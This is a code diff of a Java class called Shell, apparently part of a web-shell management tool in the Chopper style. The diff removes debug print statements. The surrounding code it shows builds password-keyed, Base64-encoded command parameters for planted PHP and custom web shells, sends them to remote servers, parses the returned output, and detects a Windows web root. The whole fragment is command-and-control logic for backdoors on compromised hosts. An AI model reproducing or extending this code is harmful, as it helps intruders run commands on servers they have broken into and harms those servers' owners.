@@ -108,7 +108,7 @@ public class Shell {
 		} catch (Exception e) {
 
 		}
-		System.out.println(params);
+		//System.out.println(params);
 		return re;
 	}
 
@@ -149,7 +149,6 @@ public class Shell {
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		re[0] = Arrays.toString(index_datas);
 		re[0] = re[0].substring(re[0].indexOf("[") + 1, re[0].indexOf("[S]"));
-		System.out.println(params);
 		String path = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
 				Arrays.toString(index_datas).indexOf("[E]"));
 		re[1] = path;
@@ -191,11 +190,9 @@ public class Shell {
 		}
 		tmp = (new BASE64Encoder().encode(z12)).toString() + "&"+Safe.PARAM2+"=" + (new BASE64Encoder().encode(z22)).toString();
 		params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_SHELL, tmp);
-		System.out.println("params_php="+params);
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String result = null;
 		result = Arrays.toString(index_datas);
-		System.out.println("phpresult="+result);
 		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf("[S]"));
 		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
 				Arrays.toString(index_datas).indexOf("[E]"));
@@ -251,13 +248,11 @@ public class Shell {
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String result = null;
 		result = Arrays.toString(index_datas);
-		System.out.println(result);
 		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf("[S]"));
 		if(result.indexOf("[E]")+3<(result.length()-1))
 		{
 		String erroroutput = result.substring(result.indexOf("[E]") + 3, (result.length()-1));
 		re[0] = re[0] + erroroutput;
-		System.out.println("r0="+re[0]);
 		}
 		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf("[S]") + 3,
 				Arrays.toString(index_datas).indexOf("[E]"));
@@ -287,13 +282,10 @@ public class Shell {
 		//params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_SHELL,URLEncoder.encode(z1),URLEncoder.encode(z2),URLEncoder.encode(pa));
 		params = Safe.PASS+"=1&"+Safe.ACTION+"="+Safe.CUS_SHELL+"&"+Safe.PARAM1+"="+URLEncoder.encode(z1)+"&"+Safe.PARAM2+"="
 		+URLEncoder.encode(z2)+"&"+Safe.PARAM3+"="+URLEncoder.encode(pa);
-		System.out.println("cusshell="+params);
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String result = Arrays.toString(index_datas);
-		System.out.println("res="+result);
 		String spl = Safe.CUS_SHELL_SPL;
 		String spr = Safe.CUS_SHELL_SPR;
-		System.out.println("spl="+spl+"|"+spr);
 		re[0] = result.substring(result.indexOf("[") + 1, result.indexOf(spl));
 		re[1] = Arrays.toString(index_datas).substring(Arrays.toString(index_datas).indexOf(spl) + spl.length(),
 				Arrays.toString(index_datas).indexOf(spr));
@@ -352,11 +344,9 @@ public class Shell {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		System.out.println("init shell="+params);
 		String[] index_datas = Common.send(url, params, code).split("\t");
 		String webroot = index_datas[0];
 		pa = webroot;
-		System.out.println(pa);
 		if (webroot.contains(":")) // windows系统
 		{
 			Safe.SYSTEMSP = "\\";
